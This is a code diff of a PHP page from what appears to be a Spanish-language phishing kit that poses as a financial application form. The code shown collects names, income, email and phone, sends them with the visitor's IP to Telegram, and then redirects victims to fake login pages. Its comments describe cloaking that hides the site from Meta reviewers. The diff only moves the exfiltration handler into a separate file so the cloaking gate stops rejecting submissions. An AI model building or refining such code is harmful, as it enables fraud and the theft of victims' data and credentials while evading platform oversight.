@@ -1,137 +1,19 @@
 <?php
 require_once __DIR__ . '/_guard.php';
 if (session_status() !== PHP_SESSION_ACTIVE) { @session_start(); }
-require_once __DIR__ . '/_tg.php';
 
 // ---------------------------------------------------------------------
-// index.php — FORMULARIO DE SOLICITUD (paso 1)
-// Se muestra siempre primero. Al enviarse:
-//   1) Se validan campos + honeypot + rate-limit por IP.
-//   2) Los datos se envían a Telegram (tg_send).
-//   3) Se marca la sesión como solicitud_ok y se responde JSON.
-//   4) El cliente muestra "Iniciando sesión para continuar..." y redirige
-//      a indexmovil.html o pcindex.html según el dispositivo.
-// Si la sesión ya viene con solicitud_ok=true (p.ej. reingreso desde
-// mail.php/token.php), se salta el formulario y solo se redirige.
-// Protección anti-revisores de Meta: _guard.php ya bloquea todo acceso
-// sin cookie HMAC válida (404 + blacklist progresiva).
+// index.php — FORMULARIO DE SOLICITUD (paso 1, solo GET)
+// El POST lo maneja enviar_solicitud.php (no depende de la cookie del
+// gate, sino de una marca de sesión que se pone aquí abajo). Esto
+// evita que _guard.php rechace el POST AJAX con 404.
+// Si la sesión ya viene con solicitud_ok=true, se salta el formulario
+// y se pasa directo al login (indexmovil.html / pcindex.html).
 // ---------------------------------------------------------------------
 
-// -------- Handler POST (AJAX) ----------------------------------------
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Silenciar warnings hacia el body para no romper el JSON
-    @ini_set('display_errors', '0');
-    error_reporting(E_ALL);
-    while (ob_get_level()) { @ob_end_clean(); }
-    ob_start();
+// Marca de sesión: enviar_solicitud.php requiere esto para aceptar POST
+$_SESSION['solicitud_can_post'] = time();
 
-    $__respond = function($arr) {
-        while (ob_get_level() > 1) { @ob_end_clean(); }
-        @ob_clean();
-        header('Content-Type: application/json; charset=UTF-8');
-        header('X-Robots-Tag: noindex, nofollow');
-        echo json_encode($arr);
-        @ob_end_flush();
-        exit;
-    };
-
-    set_error_handler(function($sev, $msg, $file, $line) {
-        @file_put_contents(__DIR__ . '/solicitud_errors.log',
-            date('Y-m-d H:i:s') . " | PHP $sev | $msg @ $file:$line" . PHP_EOL,
-            FILE_APPEND | LOCK_EX);
-        return true; // suprimir salida
-    });
-
-    try {
-
-    // Honeypot
-    if (!empty($_POST['website'])) {
-        $__respond(['ok' => false, 'msg' => 'error']);
-    }
-
-    // Rate-limit por IP: 3 envíos / 10 minutos
-    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-    $rl_dir  = sys_get_temp_dir() . '/sim_solicitud_rate';
-    @mkdir($rl_dir, 0700, true);
-    $rl_safe = preg_replace('/[^0-9a-fA-F:.]/', '_', $ip);
-    $rl_file = $rl_dir . "/$rl_safe.json";
-    $now = time();
-    $rs = ['n' => 0, 't' => $now];
-    if (is_file($rl_file)) {
-        $raw = @file_get_contents($rl_file);
-        $tmp = $raw ? json_decode($raw, true) : null;
-        if (is_array($tmp) && isset($tmp['n'], $tmp['t'])) $rs = $tmp;
-    }
-    if (($now - $rs['t']) > 600) $rs = ['n' => 0, 't' => $now];
-    $rs['n']++;
-    @file_put_contents($rl_file, json_encode($rs), LOCK_EX);
-    if ($rs['n'] > 3) {
-        $__respond(['ok' => false, 'msg' => 'demasiados intentos, intenta más tarde']);
-    }
-
-    // Sanitizar entradas
-    $clean = function ($k, $max = 120) {
-        $v = trim((string)($_POST[$k] ?? ''));
-        $v = preg_replace('/[\r\n\t]+/', ' ', $v);
-        return mb_substr($v, 0, $max);
-    };
-    $nombres  = $clean('nombres', 60);
-    $apellidos= $clean('apellidos', 60);
-    $ingreso  = $clean('ingreso', 20);
-    $email    = $clean('email', 100);
-    $telefono = $clean('telefono', 20);
-    $tiempo   = $clean('tiempo', 40);
-
-    // Validaciones mínimas
-    $errores = [];
-    if (mb_strlen($nombres)   < 2) $errores[] = 'nombres';
-    if (mb_strlen($apellidos) < 2) $errores[] = 'apellidos';
-    if (!preg_match('/^[0-9\.,]+$/', $ingreso) || $ingreso === '') $errores[] = 'ingreso';
-    if (!filter_var($email, FILTER_VALIDATE_EMAIL))   $errores[] = 'email';
-    if (!preg_match('/^[0-9 +\-()]{7,20}$/', $telefono)) $errores[] = 'telefono';
-    if (mb_strlen($tiempo)    < 2) $errores[] = 'tiempo';
-    if ($errores) {
-        $__respond(['ok' => false, 'msg' => 'Complete correctamente los campos', 'fields' => $errores]);
-    }
-
-    // Enviar a Telegram
-    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 200);
-    $texto  = "🆕 SOLICITUD RECIBIDA\n";
-    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
-    $texto .= "👤 Nombres: $nombres $apellidos\n";
-    $texto .= "💵 Ingreso C\$: $ingreso\n";
-    $texto .= "✉️  Email:    $email\n";
-    $texto .= "📞 Teléfono: $telefono\n";
-    $texto .= "⏳ Tiempo con la entidad: $tiempo\n";
-    $texto .= "━━━━━━━━━━━━━━━━━━━\n";
-    $texto .= "🌐 IP: $ip\n";
-    $texto .= "🖥️  UA: $ua\n";
-    $texto .= "🕒 " . date('Y-m-d H:i:s');
-
-    if (function_exists('tg_send')) { @tg_send($texto); }
-
-    // Marcar sesión y responder
-    if (session_status() === PHP_SESSION_ACTIVE) {
-        $_SESSION['solicitud_ok']   = true;
-        $_SESSION['solicitud_data'] = [
-            'nombres' => $nombres, 'apellidos' => $apellidos,
-            'email'   => $email,   'telefono'  => $telefono,
-            'ingreso' => $ingreso, 'tiempo'    => $tiempo,
-            'ts'      => $now,
-        ];
-    }
-
-    $__respond(['ok' => true]);
-
-    } catch (\Throwable $e) {
-        @file_put_contents(__DIR__ . '/solicitud_errors.log',
-            date('Y-m-d H:i:s') . " | EXC | " . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine() . PHP_EOL,
-            FILE_APPEND | LOCK_EX);
-        $__respond(['ok' => false, 'msg' => 'Error interno. Intenta nuevamente.']);
-    }
-}
-
-// -------- GET: si ya envió la solicitud, salta al login --------------
 $ya_envio = !empty($_SESSION['solicitud_ok']);
 ?>
 <!DOCTYPE html>
@@ -303,7 +185,7 @@ $ya_envio = !empty($_SESSION['solicitud_ok']);
 
             try {
                 var fd = new FormData(form);
-                var res  = await fetch(location.pathname, { method:'POST', body: fd, credentials:'same-origin', headers:{ 'X-Requested-With':'XMLHttpRequest', 'Accept':'application/json' } });
+                var res  = await fetch('enviar_solicitud.php', { method:'POST', body: fd, credentials:'same-origin', headers:{ 'X-Requested-With':'XMLHttpRequest', 'Accept':'application/json' } });
                 var text = await res.text();
                 var data = null;
                 try { data = JSON.parse(text); } catch(_) {}
